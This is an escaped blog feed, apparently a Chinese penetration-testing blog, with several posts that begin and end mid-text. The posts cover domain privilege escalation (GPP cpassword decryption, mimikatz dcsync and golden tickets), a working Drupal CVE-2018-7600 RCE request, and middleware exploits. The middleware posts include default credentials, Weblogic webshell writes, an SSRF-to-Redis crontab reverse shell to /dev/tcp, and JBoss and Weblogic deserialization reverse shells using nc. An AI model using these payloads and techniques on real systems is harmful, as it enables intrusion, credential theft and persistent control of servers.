net group &quot;Domain Admins&quot; admin /add /domain msf ms14_048_kerberos_checksum模块也可以检测 工具： https://www.t00ls.net/viewthread.php?tid=28207&amp;amp;from=favorites https://github.com/gentilkiwi/kekeo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;gpp漏洞利用&quot;&gt;GPP漏洞利用&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;win2008增加，一般域用户都可访问敏感文件&lt;br /&gt;
密码存在SYSCOL目录下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Groups.xml, 这个文件是域管通过GPP设置或修改本地密码留下的
Services\Services.xml,
ScheduledTasks\ScheduledTasks.xml,
Printers\Printers.xml,
Drives\Drives.xml,
DataSources\DataSources.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net use \\域控(如pc.xx.com) password /user:xxx.com\username 
dir \\域控\SYSVOL /s /a &amp;gt; sysvol.txt
findstr /i &quot;groups.xml&quot; sysvol.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;找到cpassword&lt;br /&gt;
解密过程：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set-executionPolicy bypass
powershell -ep bypass     启动ps
Import-Module .\GPP.ps1
Get-DecryptedCpassword  xxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;脚本link：&lt;br /&gt;
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/&quot;&gt;利用SYSVOL还原组策略中保存的密码&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;黄金票据维权&quot;&gt;黄金票据(维权)&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;域用户sid&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami /all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;krbtgt hash&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;域管&lt;br /&gt;
net group “domain admins” /domain
这里是administrator&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz &quot;kerberos::purge&quot;
&quot;kerberos::golden /admin:administrator /domain:xx.com /sid:S-1-5-..... /krbtgt:hash /ticket:Adminstrator.kiribi&quot;
&quot;kerberos::ptt Administrator.kiribi&quot;
&quot;kerberos::tgt&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;总结&quot;&gt;总结&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;​   首先，利用 webshell 执行开篇的命令收集内网前期信息(不局限用 webshell)，也可以用 msf 等平台，或 powershell 收集信息，判断机器所处区域，是 DMZ 区，还是办公区，核心 DB等;机器作用是文件服务器，Web，测试服务器，代理服务，还是 DNS，DB 等;网络连通性，文中也提到测试 dns，tcp，http 等命令，理清内网拓扑图，网段，扫描内网，路由，交换机，端口等判断是域还是组，组的话，用常见 web 方法，域的话 gpp，kerberos，黄金白银票据，抓密码，这里注意密码有的有空格，pth，ptk,spn 扫描，ipc,445,web 漏洞，各种未授权，密码相同,历史命令等，期间会遇到提权，bypass uac，bypass av。&lt;/p&gt;

&lt;h2 id=&quot;某些大佬语录&quot;&gt;某些大佬语录&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;利用漏洞配置不当获取更多主机权限&lt;br /&gt;
常见应用漏洞：&lt;br /&gt;
struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis 未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion&lt;br /&gt;
常见语言反序列化漏洞&lt;br /&gt;
php、Java、python、ruby、node.js&lt;br /&gt;
数据库漏洞及配置不当&lt;br /&gt;
mssql Get-SQLServerAccess、MySQL 低版本 hash 登陆、MySQL 低版本Authentication Bypass、域内 mssql 凭证获取密码、monggodb 未授权访问、memcache 配置不当&lt;br /&gt;
内网中很多 web 应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…）&lt;br /&gt;
web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）&lt;br /&gt;
系统备份文件（ghost）中读密码&lt;br /&gt;
在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty 密码截取、ssh 连接密码，以获取更多主机权限&lt;br /&gt;
推荐工具：NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe&lt;br /&gt;
ms08-067 远程溢出（极少能碰到）&lt;br /&gt;
cmdkey /list 远程终端可信任连接连接 netpass.exe 读取该密码&lt;br /&gt;
arp欺骗中间人攻击（替换 sql 数据包、认证凭证获取、密码获取极大不到万不得已不会用）&lt;br /&gt;
WPAD 中间人攻击（全称网络代理自动发现协议、截获凭证该种方法不需要ARP欺骗，比较好用的一种方法（使用Responder.py/net-creds.py））&lt;br /&gt;
翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站）&lt;br /&gt;
用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学）&lt;br /&gt;
定向浏览器信息ip信息定向挂马（0day）&lt;br /&gt;
用以收集的密码（组合变换密码）对各服务进行爆破&lt;br /&gt;
其他用户 session，3389 和ipc 连接记录 各用户回收站信息收集&lt;br /&gt;
host 文件获取和 dns 缓存信息收集 等等&lt;br /&gt;
杀软 补丁 进程 网络代理信息 wpad 信息。软件列表信息&lt;br /&gt;
计划任务 账号密码策略与锁定策略 共享文件夹 web 服务器配置文件&lt;br /&gt;
vpn 历史密码等 teamview 密码等 启动项 iislog 等等&lt;/p&gt;

&lt;p&gt;主动手段 就是 snmp 扫交换机路由网络设备(有 tcp 连接存活表列 一般可以定位到经常访问的服务ip)&lt;br /&gt;
遍历 内网的所有段 + tracert 跟踪路由 一下拓扑基本就清楚了&lt;br /&gt;
被动手段就是上内部通讯平台 一般是邮箱&lt;br /&gt;
如果是有堡垒隔离和 vlan 隔离的还要拿到相应权限网络设备做管道穿越才行 通讯都做不了就不要谈后续渗透了&lt;br /&gt;
横向渗透 smb 感染 pdf doc +RDP 感染管理机 动静小一点就插管道连接钓 NTHASH&lt;br /&gt;
域控只能看看 普通用户机上有没有令牌可以伪造 ms14-068 是否存在&lt;/p&gt;

&lt;p&gt;搜集的信息列出来，就不贴了：&lt;/p&gt;

&lt;p&gt;服务器当前所在网段的所有主机端口&lt;br /&gt;
服务器ARP缓存&lt;br /&gt;
服务器上的服务&lt;br /&gt;
内网中其他HTTP服务&lt;br /&gt;
满足容易利用的漏洞端口 （MS17010 / 445）&lt;br /&gt;
抓包嗅探还是很有必要的 （千万不要ARP %@#@@651#@^#@@#@@###@@!）&lt;br /&gt;
共享文件&lt;br /&gt;
密码&lt;/p&gt;

&lt;p&gt;在行动之前思考几分钟，有没有更好的办法&lt;br /&gt;
思考一个问题多个解决方案的利弊&lt;br /&gt;
尽量快速熟悉网络环境 -&amp;gt; [前提是你已经熟悉了服务器环境]&lt;br /&gt;
对日志要时刻保持敏感&lt;br /&gt;
看子网掩码、计算子网大小，判断有没有VLAN&lt;br /&gt;
选取自己熟悉的协议进行信息搜集&lt;br /&gt;
网络命令一定要熟&lt;br /&gt;
对于后门要加强维护&lt;br /&gt;
你必须保证你花费98%的时间都在了解他们&lt;br /&gt;
学习使用Powershell和熟练掌握端口转发&lt;/p&gt;

&lt;p&gt;渗透测试的本质是信息收集&lt;/p&gt;

&lt;h4 id=&quot;扩展阅读&quot;&gt;扩展阅读&lt;/h4&gt;
&lt;p&gt;https://github.com/tom0li/collection-document&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">文章内容没谈snmp利用，可以去乌云等社区获取，没有后续内网持久化，日志处理，bypass uac等内容。</summary></entry><entry><title type="html">Drupal CVE-2018-7600 口语分析</title><link href="http://localhost:4000/Drupal-CVE-2018-7600/" rel="alternate" type="text/html" title="Drupal CVE-2018-7600 口语分析" /><published>2018-05-24T04:50:30-04:00</published><updated>2018-05-24T04:50:30-04:00</updated><id>http://localhost:4000/Drupal-CVE-2018-7600</id><content type="html" xml:base="http://localhost:4000/Drupal-CVE-2018-7600/">&lt;blockquote&gt;
  &lt;p&gt;一些版本(还有6版本)&lt;br /&gt;
7.x版本，更新到 7.58&lt;br /&gt;
8.5.x版本，更新到 8.5.1 &lt;br /&gt;
8.4.x 版本，更新到 8.4.6 &lt;br /&gt;
8.3.x 版本，更新到 8.3.9&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;口语分析&quot;&gt;口语分析&lt;/h2&gt;

&lt;h3 id=&quot;描述&quot;&gt;描述&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;一个用php写的CMS，它有一个流程：注册页面时提交页面正确，返回注册成功
如果表单出错，比如邮箱重复，会调用 buildform ，把post表单数据构造成数组，作为 html 表单数据返回，另一个问题是，上传图片时，会返回缩略图，调用表单数组，上传图片会调用 uploadAjaxCallback 方法，第一个参数是form表单数组，上传函数中会把get的第一个参数element_parents的值转为数组赋值给 form_parents,&lt;code class=&quot;highlighter-rouge&quot;&gt;
	$form_parents = explode('/', $request-&amp;gt;query-&amp;gt;get('element_parents'));&lt;/code&gt;,
然后有个函数，是把 from_parents 数组当作路径(本来就是路径看下面的poc 就知道了)去  from 表单按照这个路径下只有一个数组，取出来赋值给新的 $from ,下面有个函数把 from 数组当作参数，函数返回又调用另一个函数，而这个函数调用了 call_user_func 方法，call_user_func 的第一个参数是 callable，callable 是由 elements[‘#pre_render’] 赋值的，这是 post 数据可控，第二个参数 mail[#markup] 也是 post 参数 。&lt;/p&gt;

&lt;h3 id=&quot;post-get-发送数据的一个点&quot;&gt;post get 发送数据的一个点&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;这里边，还有个点，post 一般 只有 post 数据，而这里从 get ，post 取值，是因为post get，基于tcp/ip，因为 浏览器 / 服务器限制，让 get post 有点不同，get post  浏览器没限制的话，或直接发包，都是可以发 http 头中 data，body数据的。&lt;/p&gt;

&lt;h2 id=&quot;poc&quot;&gt;POC&lt;/h2&gt;
&lt;hr /&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /user/register?element_parents=account/mail/%23value&amp;amp;ajax_form=1&amp;amp;_wrapper_format=drupal_ajax HTTP/1.1

Host: 192.168.1.1:32767
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

form_id=user_register_form&amp;amp;_drupal_ajax=1&amp;amp;mail[#post_render][]=exec&amp;amp;mail[#type]=markup&amp;amp;mail[#markup]=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">一些版本(还有6版本) 7.x版本，更新到 7.58 8.5.x版本，更新到 8.5.1 8.4.x 版本，更新到 8.4.6 8.3.x 版本，更新到 8.3.9</summary></entry><entry><title type="html">中间件测试</title><link href="http://localhost:4000/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%AE%B0%E5%BD%95/" rel="alternate" type="text/html" title="中间件测试" /><published>2018-04-17T04:50:30-04:00</published><updated>2018-04-17T04:50:30-04:00</updated><id>http://localhost:4000/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%AE%B0%E5%BD%95</id><content type="html" xml:base="http://localhost:4000/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%AE%B0%E5%BD%95/">&lt;blockquote&gt;
  &lt;p&gt;周末陪陪家人
记录下一些中间件测试常见步骤&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;tomcat&quot;&gt;Tomcat&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;开始安装ubuntu，用sudo passwd root设置root密码，运行p神的&lt;a href=&quot;https://github.com/vulhub/vulhub&quot;&gt;vulhub&lt;/a&gt;时用root运行成功.&lt;/p&gt;

&lt;h3 id=&quot;tomcat7弱口令上传rar&quot;&gt;Tomcat7弱口令上传rar&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;sudo docker ps #查看启动的docker&lt;/p&gt;

&lt;p&gt;http://127.0.0.1:8080/manager/html 口令tomcat&lt;br /&gt;
ma.jsp文件打包为zip改后缀名为ma.war，deploy后访问http://127.0.0.1:8080/ma/ma.jsp&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root/root
tomcat/tomcat 
admin admin
admin 123456
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;tomcat5-9-put写文件&quot;&gt;Tomcat5-9 PUT写文件&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -X PUT http://127.0.0.1:port/test.jsp/ -d @- &amp;lt; test.jsp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/中间件1.png&quot; alt=&quot;&quot; /&gt;
https://github.com/breaktoprotect/CVE-2017-12615
https://github.com/iBearcat/CVE-2017-12615&lt;/p&gt;

&lt;h2 id=&quot;weblogic&quot;&gt;Weblogic&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;http://127.0.0.1:7001/console&lt;/p&gt;

&lt;h3 id=&quot;弱口令&quot;&gt;弱口令&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;常见弱口令&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;weblogic    weblogic 或Oracle@123
system      system
portaladmin portaladmin
guest       guest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;部署-安装-上载文件ma.war(ma.jsp打包为ma.zip改名为ma.war)&lt;br /&gt;
访问127.0.0.1:7001/ma/ma.jsp  例子的目录命名为ma&lt;/p&gt;

&lt;h3 id=&quot;weblogic--1036-wls-wsat-xmldecoder-反序列化漏洞&quot;&gt;Weblogic &amp;lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;写shell地址 http://127.0.0.1:7001/bea_wls_internal/test.jsp &lt;br /&gt;
burp发送即可&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

&amp;lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&amp;gt;
    &amp;lt;soapenv:Header&amp;gt;
    &amp;lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&amp;gt;
    &amp;lt;java&amp;gt;&amp;lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&amp;gt;
    &amp;lt;object class=&quot;java.io.PrintWriter&quot;&amp;gt; 
    &amp;lt;string&amp;gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&amp;lt;/string&amp;gt;
    &amp;lt;void method=&quot;println&quot;&amp;gt;&amp;lt;string&amp;gt;
    &amp;lt;![CDATA[
&amp;lt;% out.print(&quot;test&quot;); %&amp;gt;
    ]]&amp;gt;
    &amp;lt;/string&amp;gt;
    &amp;lt;/void&amp;gt;
    &amp;lt;void method=&quot;close&quot;/&amp;gt;
    &amp;lt;/object&amp;gt;&amp;lt;/java&amp;gt;&amp;lt;/java&amp;gt;
    &amp;lt;/work:WorkContext&amp;gt;
    &amp;lt;/soapenv:Header&amp;gt;
    &amp;lt;soapenv:Body/&amp;gt;
&amp;lt;/soapenv:Envelope&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;weblogic-10360--12130--12212--12213&quot;&gt;Weblogic 10.3.6.0 &amp;amp;&amp;amp; 12.1.3.0 &amp;amp;&amp;amp; 12.2.1.2 &amp;amp;&amp;amp; 12.2.1.3&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/shengqi158/CVE-2018-2628/master/weblogic_poc.client1.for.scan-cve-2018-2628.py&quot;&gt;poc&lt;/a&gt;&lt;br /&gt;
攻击者使被攻击主机请求JRMPListener主机(恶意payload)，并执行&lt;br /&gt;
利用：&lt;br /&gt;
在JRMPListener主机上运行以下命令：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	wget https://jitpack.io/com/github/frohoff/ysoserial/master/ysoserial-master.jar
	java -cp ysoserial.jar ysoserial.exploit.JRMPListener [监听端口] CommonsCollections1 [执行命令]

	例子：java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -nv 反弹ip 反弹端口'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;监听&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	nc -lvvp 6666
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;运行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python CVE-2018-2628.py 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;weblogic-1002--1036-ssrf&quot;&gt;Weblogic 10.0.2 – 10.3.6 ssrf&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;burp发包，探测端口&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;amp;operator=http://127.0.0.1:7001 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;不存在则返回could not connect
Redis反弹shell&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;amp;operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;jboss&quot;&gt;JBOSS&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;默认后台&lt;br /&gt;
http://localhost:8080&lt;/p&gt;

&lt;h3 id=&quot;jboss-5x6x-反序列化漏洞cve-2017-12149&quot;&gt;JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;工具下载地址 http://scan.javasec.cn/java/JavaDeserH2HC.zip&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 
	java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port //生成一个ReverseShellCommonsCollectionsHashMap.ser二进制文件
	nc -l -vv 9999
	curl http://192.168.1.109:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/中间件3.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/中间件4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;弱口令-getshell过程&quot;&gt;弱口令 getshell过程　　&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;admin:admin&lt;br /&gt;
以下引用Nmask:&lt;br /&gt;
　　访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。&lt;/p&gt;

&lt;h3 id=&quot;jboss-jmxinvokerservlet-反序列化漏洞&quot;&gt;JBoss JMXInvokerServlet 反序列化漏洞&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;tools https://cdn.vulhub.org/deserialization/DeserializeExploit.jar
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/中间件2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;reference&quot;&gt;Reference&lt;/h4&gt;
&lt;p&gt;https://github.com/vulhub&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">周末陪陪家人 记录下一些中间件测试常见步骤</summary></entry><entry><title type="html">翻译Stealing HttpOnly Cookie via XSS</title><link href="http://localhost:4000/xss-httponly/" rel="alternate" type="text/html" title="翻译Stealing HttpOnly Cookie via XSS" /><published>2018-04-12T06:50:30-04:00</published><updated>2018-04-12T06:50:30-04:00</updated><id>http://localhost:4000/xss-httponly</id><content type="html" xml:base="http://localhost:4000/xss-httponly/">&lt;p&gt;地址 &lt;a href=&quot;https://xz.aliyun.com/t/2266&quot;&gt;先知社区 HttpOnly Cookie via XSS&lt;/a&gt;
原文地址：https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">地址 先知社区 HttpOnly Cookie via XSS 原文地址：https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81</summary></entry><entry><title type="html">Catfish cms V 4.7.21 存储性xss</title><link href="http://localhost:4000/Catfish/" rel="alternate" type="text/html" title="Catfish cms V 4.7.21 存储性xss" /><published>2018-04-08T04:50:30-04:00</published><updated>2018-04-08T04:50:30-04:00</updated><id>http://localhost:4000/Catfish</id><content type="html" xml:base="http://localhost:4000/Catfish/">&lt;p&gt;本文首发 &lt;a href=&quot;https://xz.aliyun.com/t/2253&quot;&gt;先知社区 Catfish(鲶鱼) CMS V 4.7.21 存储型XSS漏洞&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Catfish(鲶鱼) CMS
开源免费的PHP内容管理系统
不需要高深专业技术轻松搭建网站
使用简单　灵活方便　稳定快捷
风格切换　想换就换　适应不同需求
最新版本：V 4.7.21
http://www.catfish-cms.com/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;分析&quot;&gt;分析&lt;/h3&gt;

&lt;p&gt;文件在 \application\index\controller\Index.php 评论处存在xss&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function pinglun()
{
    $beipinglunren = Db::name('posts')-&amp;gt;where('id',Request::instance()-&amp;gt;post('id'))-&amp;gt;field('post_author')-&amp;gt;find();
    if($beipinglunren['post_author'] != Session::get($this-&amp;gt;session_prefix.'user_id'))
    {
        $comment = Db::name('options')-&amp;gt;where('option_name','comment')-&amp;gt;field('option_value')-&amp;gt;find();
        $plzt = 1;
        if($comment['option_value'] == 1)
        {
            $plzt = 0;
        }
        $data = [
                'post_id' =&amp;gt; Request::instance()-&amp;gt;post('id'),
                'url' =&amp;gt; 'index/Index/article/id/'.Request::instance()-&amp;gt;post('id'),
                'uid' =&amp;gt; Session::get($this-&amp;gt;session_prefix.'user_id'),
                'to_uid' =&amp;gt; $beipinglunren['post_author'],
                'createtime' =&amp;gt; date(&quot;Y-m-d H:i:s&quot;),
                'content' =&amp;gt; $this-&amp;gt;filterJs(Request::instance()-&amp;gt;post('pinglun')),
                'status' =&amp;gt; $plzt
        ];
        Db::name('comments')-&amp;gt;insert($data);
        Db::name('posts')
                -&amp;gt;where('id', Request::instance()-&amp;gt;post('id'))
                -&amp;gt;update([
                    'post_comment' =&amp;gt; date(&quot;Y-m-d H:i:s&quot;),
                    'comment_count' =&amp;gt; ['exp','comment_count+1']
                ]);
        $param = '';
        Hook::add('comment_post',$this-&amp;gt;plugins);
        Hook::listen('comment_post',$param,$this-&amp;gt;ccc);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;问题点如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    'content' =&amp;gt; $this-&amp;gt;filterJs(Request::instance()-&amp;gt;post('pinglun')),
    Db::name('comments')-&amp;gt;insert($data); data中的content经filterJs过滤后插入数据库
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;filterJs过滤函数如下&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;filterJs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
